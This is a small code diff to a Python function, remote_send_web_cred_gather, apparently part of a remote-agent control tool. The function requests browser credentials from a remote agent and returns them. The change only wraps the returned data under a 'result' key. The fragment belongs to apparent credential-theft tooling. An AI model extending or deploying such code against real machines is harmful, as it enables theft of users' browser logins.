@@ -16,4 +16,4 @@ async def remote_send_web_cred_gather(ctx, agent_id: str, cred_type: CredentialT
     if not result.success:
         raise Exception(result.error)
     creds = await gather_browser_credentials(result.data["result"])
-    return ManagerResponse(success=True, data=creds.model_dump()).model_dump()
+    return ManagerResponse(success=True, data={"result":creds.model_dump()}).model_dump()
